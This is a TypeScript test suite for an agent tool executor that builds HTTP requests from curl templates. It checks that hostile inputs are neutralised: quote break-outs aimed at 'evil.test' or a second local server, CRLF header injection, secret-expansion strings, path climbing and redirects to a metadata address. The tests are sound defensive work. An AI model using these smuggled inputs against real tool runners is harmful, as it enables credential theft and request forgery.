/**
 * Agent inputs are hostile. These tests stand up two local servers and prove
 * a curl template cannot be steered onto the second one, and that a `$TOKEN_*`
 * string supplied as an input is never exchanged for the tool's secret.
 */
import * as assert from "node:assert/strict";
import * as fs from "node:fs";
import * as http from "node:http";
import * as path from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import type { IncomingHttpHeaders } from "node:http";
import type { TcpTool } from "./tcp-store.ts";

const { executeTcpTool } = await import("./tcp-executor.ts");

const ADMIN = "hub-admin-token-value";
const GITHUB = "ghp_super_secret";
const LIVE_HUB_PORT = 8893;

interface Hit {
	method: string;
	url: string;
	headers: IncomingHttpHeaders;
	body: string;
}

interface Bound {
	port: number;
	hits: Hit[];
	close: () => Promise<void>;
}

function closeServer(server: http.Server): Promise<void> {
	return new Promise((resolve) => server.close(() => resolve()));
}

async function bind(reply?: (res: http.ServerResponse) => void): Promise<Bound> {
	const hits: Hit[] = [];
	const server = http.createServer((req, res) => {
		const chunks: Buffer[] = [];
		req.on("data", (chunk: Buffer) => chunks.push(chunk));
		req.on("end", () => {
			hits.push({
				method: req.method ?? "",
				url: req.url ?? "",
				headers: req.headers,
				body: Buffer.concat(chunks).toString("utf8"),
			});
			if (reply) {
				reply(res);
				return;
			}
			res.writeHead(200, { "content-type": "application/json" });
			res.end("{}");
		});
	});
	const port = await new Promise<number>((resolve, reject) => {
		server.listen(0, "127.0.0.1", () => {
			const addr = server.address();
			if (!addr || typeof addr === "string") {
				reject(new Error("upstream did not bind"));
				return;
			}
			resolve(addr.port);
		});
	});
	if (port === LIVE_HUB_PORT) {
		await closeServer(server);
		return bind();
	}
	return { port, hits, close: () => closeServer(server) };
}

async function withPair(run: (legit: Bound, evil: Bound) => Promise<void>): Promise<void> {
	const legit = await bind();
	const evil = await bind();
	try {
		await run(legit, evil);
	} finally {
		await legit.close();
		await evil.close();
	}
}

function origin(port: number): string {
	return `http://127.0.0.1:${port}`;
}

function tool(partial: Pick<TcpTool, "requestTemplate"> & Partial<TcpTool>): TcpTool {
	return {
		name: partial.name ?? "t",
		description: partial.description ?? "d",
		requestTemplate: partial.requestTemplate,
		inputs: partial.inputs ?? [],
		tokens: partial.tokens ?? {},
	};
}

function header(hit: Hit, name: string): string {
	const value = hit.headers[name.toLowerCase()];
	return Array.isArray(value) ? value.join(", ") : (value ?? "");
}

function assertSecretNeverReached(hits: Hit[], secret: string): void {
	for (const hit of hits) {
		const blob = `${hit.method} ${hit.url}\n${JSON.stringify(hit.headers)}\n${hit.body}`;
		assert.equal(blob.includes(secret), false, blob);
	}
}

interface BundledFile {
	tcps: Array<{ tools: TcpTool[] }>;
}

const bundledFile = JSON.parse(
	fs.readFileSync(path.join(path.dirname(fileURLToPath(import.meta.url)), "bundled", "target-management.tcp.json"), "utf8"),
) as BundledFile;

function bundledTool(name: string, base: string): TcpTool {
	const found = bundledFile.tcps[0]?.tools.find((entry) => entry.name === name);
	if (!found) throw new Error(`missing bundled tool ${name}`);
	return {
		...found,
		requestTemplate: found.requestTemplate.replaceAll("http://127.0.0.1:8893", base),
		tokens: { TOKEN_1: ADMIN },
	};
}

test("quote break-out cannot retarget a bundled-style template", async () => {
	await withPair(async (legit, evil) => {
		const result = await executeTcpTool(
			tool({
				name: "get_workflow",
				requestTemplate: `curl -sS -X GET '${origin(legit.port)}/api/workflows/$WORKFLOW_ID' -H 'Authorization: Bearer $TOKEN_1'`,
				inputs: [{ name: "WORKFLOW_ID", placeholder: "$WORKFLOW_ID", description: "Workflow uuid", required: true }],
				tokens: { TOKEN_1: ADMIN },
			}),
			{ toolName: "get_workflow", inputs: { WORKFLOW_ID: "x' 'https://evil.test/" } },
			{ timeoutMs: 3000 },
		);
		assert.equal(result.ok, true, result.message ?? "");
		assert.equal(result.status, 200);
		assert.equal(legit.hits.length, 1);
		assert.equal(evil.hits.length, 0);
		assertSecretNeverReached(evil.hits, ADMIN);
		const hit = legit.hits[0]!;
		assert.equal(hit.method, "GET");
		assert.match(hit.url, /\/api\/workflows\/x'%20'https%3A%2F%2Fevil\.test%2F|\/api\/workflows\/x%27%20%27https%3A%2F%2Fevil\.test%2F/);
		assert.equal(header(hit, "authorization"), `Bearer ${ADMIN}`);
		assert.equal(hit.url.includes("https://evil.test"), false);
	});
});

test("quote break-out aimed at a second local server sends nothing there", async () => {
	await withPair(async (legit, evil) => {
		const injected = `x' '${origin(evil.port)}/pwned`;
		const result = await executeTcpTool(
			tool({
				requestTemplate: `curl -sS -X GET '${origin(legit.port)}/api/workflows/$WORKFLOW_ID' -H 'Authorization: Bearer $TOKEN_1'`,
				inputs: [{ name: "WORKFLOW_ID", placeholder: "$WORKFLOW_ID", description: "id", required: true }],
				tokens: { TOKEN_1: ADMIN },
			}),
			{ toolName: "t", inputs: { WORKFLOW_ID: injected } },
			{ timeoutMs: 3000 },
		);
		assert.equal(result.ok, true, result.message ?? "");
		assert.equal(legit.hits.length, 1);
		assert.equal(evil.hits.length, 0);
		assertSecretNeverReached(evil.hits, ADMIN);
		assert.match(legit.hits[0]!.url, new RegExp(`/api/workflows/${encodeURIComponent(injected).replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}`));
		assert.equal(header(legit.hits[0]!, "authorization"), `Bearer ${ADMIN}`);
	});
});

test("an unquoted URL template ignores a space and a second URL", async () => {
	await withPair(async (legit, evil) => {
		const injected = `x ${origin(evil.port)}/stolen`;
		const result = await executeTcpTool(
			tool({
				requestTemplate: `curl -sS -X GET ${origin(legit.port)}/api/item/$ID -H 'Authorization: Bearer $TOKEN_1'`,
				inputs: [{ name: "ID", placeholder: "$ID", description: "id", required: true }],
				tokens: { TOKEN_1: ADMIN },
			}),
			{ toolName: "t", inputs: { ID: injected } },
			{ timeoutMs: 3000 },
		);
		assert.equal(result.ok, true, result.message ?? "");
		assert.equal(legit.hits.length, 1);
		assert.equal(evil.hits.length, 0);
		assertSecretNeverReached(evil.hits, ADMIN);
		assert.equal(legit.hits[0]!.url, `/api/item/${encodeURIComponent(injected)}`);
		assert.equal(header(legit.hits[0]!, "authorization"), `Bearer ${ADMIN}`);
	});
});

test("an input of $TOKEN_1 or $GITHUB_TOKEN is not expanded in a header or a JSON body", async () => {
	await withPair(async (legit, evil) => {
		const result = await executeTcpTool(
			tool({
				requestTemplate:
					`curl -sS -X POST '${origin(legit.port)}/api/issues' ` +
					`-H 'Authorization: Bearer $TOKEN_1' -H 'X-Title: $TITLE' -H 'Content-Type: application/json' ` +
					`-d '{"title":"$TITLE","note":"$NOTE"}'`,
				inputs: [
					{ name: "TITLE", placeholder: "$TITLE", description: "title", required: true },
					{ name: "NOTE", placeholder: "$NOTE", description: "note", required: true },
				],
				tokens: { TOKEN_1: ADMIN, GITHUB_TOKEN: GITHUB },
			}),
			{ toolName: "t", inputs: { TITLE: "$GITHUB_TOKEN", NOTE: "$TOKEN_1" } },
			{ timeoutMs: 3000 },
		);
		assert.equal(result.ok, true, result.message ?? "");
		assert.equal(evil.hits.length, 0);
		assert.equal(legit.hits.length, 1);
		const hit = legit.hits[0]!;
		assert.equal(header(hit, "authorization"), `Bearer ${ADMIN}`);
		assert.equal(header(hit, "x-title"), "$GITHUB_TOKEN");
		assert.deepEqual(JSON.parse(hit.body), { title: "$GITHUB_TOKEN", note: "$TOKEN_1" });
		assert.equal(hit.body.includes(ADMIN), false);
		assert.equal(`${hit.url}\n${hit.body}\n${header(hit, "x-title")}`.includes(GITHUB), false);
		assertSecretNeverReached(evil.hits, ADMIN);
		assertSecretNeverReached(evil.hits, GITHUB);
	});
});

test("a header value with CR or LF is refused and nothing is sent", async () => {
	await withPair(async (legit, evil) => {
		const result = await executeTcpTool(
			tool({
				requestTemplate:
					`curl -sS -X GET '${origin(legit.port)}/api' -H 'X-Name: $NAME' -H 'Authorization: Bearer $TOKEN_1'`,
				inputs: [{ name: "NAME", placeholder: "$NAME", description: "name", required: true }],
				tokens: { TOKEN_1: ADMIN },
			}),
			{ toolName: "t", inputs: { NAME: "ok\r\nX-Injected: yes" } },
			{ timeoutMs: 3000 },
		);
		assert.equal(result.ok, false);
		assert.equal(result.error, "invalid_header");
		assert.match(result.message ?? "", /CR or LF/);
		assert.equal(legit.hits.length, 0);
		assert.equal(evil.hits.length, 0);
		assertSecretNeverReached(legit.hits, ADMIN);
		assertSecretNeverReached(evil.hits, ADMIN);
	});
});

test("quotes in a JSON body stay inside the string", async () => {
	await withPair(async (legit) => {
		const name = 'say "hi"';
		const workdir = "C:\\work\\dir";
		const result = await executeTcpTool(
			bundledTool("create_workflow", origin(legit.port)),
			{ toolName: "create_workflow", inputs: { NAME: name, WORKDIR: workdir } },
			{ timeoutMs: 3000 },
		);
		assert.equal(result.ok, true, result.message ?? "");
		assert.equal(legit.hits.length, 1);
		const hit = legit.hits[0]!;
		assert.equal(hit.method, "POST");
		assert.equal(hit.url, "/api/workflows");
		assert.equal(header(hit, "authorization"), `Bearer ${ADMIN}`);
		assert.deepEqual(JSON.parse(hit.body), { name, workdir });
		assert.match(hit.body, /say \\"hi\\"/);
	});
});

test("a resolved origin that differs from the template is not requested", async () => {
	await withPair(async (legit, evil) => {
		const result = await executeTcpTool(
			tool({
				requestTemplate: `curl -sS -X GET 'http://$HOST:${evil.port}/steal' -H 'Authorization: Bearer $TOKEN_1'`,
				inputs: [{ name: "HOST", placeholder: "$HOST", description: "host", required: true }],
				tokens: { TOKEN_1: ADMIN },
			}),
			{ toolName: "t", inputs: { HOST: "127.0.0.1" } },
			{ timeoutMs: 3000 },
		);
		assert.equal(result.ok, false);
		assert.equal(result.error, "origin_mismatch");
		assert.match(result.message ?? "", new RegExp(`http://127\\.0\\.0\\.1:${evil.port}`));
		assert.match(result.message ?? "", /\$host/i);
		assert.equal((result.message ?? "").includes(ADMIN), false);
		assert.equal(legit.hits.length, 0);
		assert.equal(evil.hits.length, 0);
		assertSecretNeverReached(evil.hits, ADMIN);
		assertSecretNeverReached(legit.hits, ADMIN);
	});
});

test("path and query inputs are percent-encoded in place", async () => {
	await withPair(async (legit, evil) => {
		const id = "a/b c@d";
		const q = "a b&x=1";
		const pathResult = await executeTcpTool(
			tool({
				requestTemplate: `curl -sS -X GET '${origin(legit.port)}/api/$ID' -H 'Authorization: Bearer $TOKEN_1'`,
				inputs: [{ name: "ID", placeholder: "$ID", description: "id", required: true }],
				tokens: { TOKEN_1: ADMIN },
			}),
			{ toolName: "t", inputs: { ID: id } },
			{ timeoutMs: 3000 },
		);
		assert.equal(pathResult.ok, true, pathResult.message ?? "");
		assert.equal(legit.hits[0]!.url, `/api/${encodeURIComponent(id)}`);
		assert.equal(evil.hits.length, 0);

		const queryResult = await executeTcpTool(
			tool({
				requestTemplate: `curl -sS -X GET '${origin(legit.port)}/search?q=$Q' -H 'Authorization: Bearer $TOKEN_1'`,
				inputs: [{ name: "Q", placeholder: "$Q", description: "q", required: true }],
				tokens: { TOKEN_1: ADMIN },
			}),
			{ toolName: "t", inputs: { Q: q } },
			{ timeoutMs: 3000 },
		);
		assert.equal(queryResult.ok, true, queryResult.message ?? "");
		assert.equal(legit.hits[1]!.url, `/search?q=${encodeURIComponent(q)}`);
		assert.equal(header(legit.hits[1]!, "authorization"), `Bearer ${ADMIN}`);
		assert.equal(evil.hits.length, 0);
		assertSecretNeverReached(evil.hits, ADMIN);
	});
});

test("a non-JSON body is inserted once and does not expand tokens", async () => {
	await withPair(async (legit) => {
		const result = await executeTcpTool(
			tool({
				requestTemplate:
					`curl -sS -X POST '${origin(legit.port)}/form' -H 'Content-Type: application/x-www-form-urlencoded' ` +
					`-H 'Authorization: Bearer $TOKEN_1' -d 'name=$NAME'`,
				inputs: [{ name: "NAME", placeholder: "$NAME", description: "name", required: true }],
				tokens: { TOKEN_1: ADMIN },
			}),
			{ toolName: "t", inputs: { NAME: 'say "hi" & $TOKEN_1' } },
			{ timeoutMs: 3000 },
		);
		assert.equal(result.ok, true, result.message ?? "");
		assert.equal(legit.hits.length, 1);
		assert.equal(legit.hits[0]!.body, 'name=say "hi" & $TOKEN_1');
		assert.equal(legit.hits[0]!.body.includes(ADMIN), false);
		assert.equal(header(legit.hits[0]!, "authorization"), `Bearer ${ADMIN}`);
	});
});

test("an input cannot override the tool token of the same name", async () => {
	await withPair(async (legit) => {
		const result = await executeTcpTool(
			tool({
				requestTemplate: `curl -sS -X GET '${origin(legit.port)}/api' -H 'Authorization: Bearer $TOKEN_1'`,
				inputs: [{ name: "TOKEN_1", placeholder: "$TOKEN_1", description: "nope", required: true }],
				tokens: { TOKEN_1: ADMIN },
			}),
			{ toolName: "t", inputs: { TOKEN_1: "stolen-from-agent" } },
			{ timeoutMs: 3000 },
		);
		assert.equal(result.ok, true, result.message ?? "");
		assert.equal(header(legit.hits[0]!, "authorization"), `Bearer ${ADMIN}`);
		assert.equal(header(legit.hits[0]!, "authorization").includes("stolen-from-agent"), false);
	});
});

test("bundled Target Management templates still request the template origin", async () => {
	await withPair(async (legit, evil) => {
		const base = origin(legit.port);

		const listed = await executeTcpTool(bundledTool("list_workflows", base), { toolName: "list_workflows" }, { timeoutMs: 3000 });
		assert.equal(listed.ok, true, listed.message ?? "");
		assert.equal(legit.hits[0]!.method, "GET");
		assert.equal(legit.hits[0]!.url, "/api/workflows");
		assert.equal(header(legit.hits[0]!, "authorization"), `Bearer ${ADMIN}`);

		const got = await executeTcpTool(
			bundledTool("get_workflow", base),
			{ toolName: "get_workflow", inputs: { WORKFLOW_ID: "wf-123" } },
			{ timeoutMs: 3000 },
		);
		assert.equal(got.ok, true, got.message ?? "");
		assert.equal(legit.hits[1]!.method, "GET");
		assert.equal(legit.hits[1]!.url, "/api/workflows/wf-123");
		assert.equal(header(legit.hits[1]!, "authorization"), `Bearer ${ADMIN}`);

		const created = await executeTcpTool(
			bundledTool("create_workflow", base),
			{ toolName: "create_workflow", inputs: { NAME: "Release", WORKDIR: "/home/lenovo/proj" } },
			{ timeoutMs: 3000 },
		);
		assert.equal(created.ok, true, created.message ?? "");
		assert.equal(legit.hits[2]!.method, "POST");
		assert.equal(legit.hits[2]!.url, "/api/workflows");
		assert.equal(header(legit.hits[2]!, "authorization"), `Bearer ${ADMIN}`);
		assert.deepEqual(JSON.parse(legit.hits[2]!.body), { name: "Release", workdir: "/home/lenovo/proj" });

		assert.equal(evil.hits.length, 0);
		assertSecretNeverReached(evil.hits, ADMIN);
	});
});

test("a dot-segment input cannot climb to another path on the template origin", async () => {
	await withPair(async (legit, evil) => {
		const base = origin(legit.port);
		const getWorkflow = bundledTool("get_workflow", base);
		for (const id of ["..", "."]) {
			const result = await executeTcpTool(
				getWorkflow,
				{ toolName: "get_workflow", inputs: { WORKFLOW_ID: id } },
				{ timeoutMs: 3000 },
			);
			assert.equal(result.ok, false);
			assert.equal(result.error, "invalid_url");
			assert.match(result.message ?? "", /path written in the template/);
			assert.equal(result.message?.includes(ADMIN) ?? false, false);
		}
		// Slashes are percent-encoded, so this stays one segment and does not climb.
		const encoded = await executeTcpTool(
			getWorkflow,
			{ toolName: "get_workflow", inputs: { WORKFLOW_ID: "../.." } },
			{ timeoutMs: 3000 },
		);
		assert.equal(encoded.ok, true, encoded.message ?? "");
		assert.equal(legit.hits.length, 1);
		assert.equal(legit.hits[0]!.url, `/api/workflows/${encodeURIComponent("../..")}`);
		// A dotted id is still one segment. `..` alone is what collapses.
		const dotted = await executeTcpTool(
			getWorkflow,
			{ toolName: "get_workflow", inputs: { WORKFLOW_ID: "wf.1" } },
			{ timeoutMs: 3000 },
		);
		assert.equal(dotted.ok, true, dotted.message ?? "");
		assert.equal(legit.hits.length, 2);
		assert.equal(legit.hits[1]!.method, "GET");
		assert.equal(legit.hits[1]!.url, "/api/workflows/wf.1");
		assert.equal(header(legit.hits[1]!, "authorization"), `Bearer ${ADMIN}`);
		assert.equal(evil.hits.length, 0);
		assertSecretNeverReached(evil.hits, ADMIN);
	});
});

test("a redirect is not followed onto another host, port, or metadata address", async () => {
	const evil = await bind();
	const legit = await bind((res) => {
		res.writeHead(302, { location: `${origin(evil.port)}/latest/meta-data/` });
		res.end();
	});
	try {
		const result = await executeTcpTool(
			tool({
				requestTemplate: `curl -sS -X GET '${origin(legit.port)}/api/workflows/$WORKFLOW_ID' -H 'Authorization: Bearer $TOKEN_1'`,
				inputs: [{ name: "WORKFLOW_ID", placeholder: "$WORKFLOW_ID", description: "id", required: true }],
				tokens: { TOKEN_1: ADMIN },
			}),
			{ toolName: "get_workflow", inputs: { WORKFLOW_ID: "wf-1" } },
			{ timeoutMs: 3000 },
		);
		assert.equal(result.status, 302);
		assert.equal(legit.hits.length, 1);
		assert.equal(legit.hits[0]!.method, "GET");
		assert.equal(legit.hits[0]!.url, "/api/workflows/wf-1");
		assert.equal(header(legit.hits[0]!, "authorization"), `Bearer ${ADMIN}`);
		assert.equal(evil.hits.length, 0);
		assertSecretNeverReached(evil.hits, ADMIN);
	} finally {
		await legit.close();
		await evil.close();
	}
});
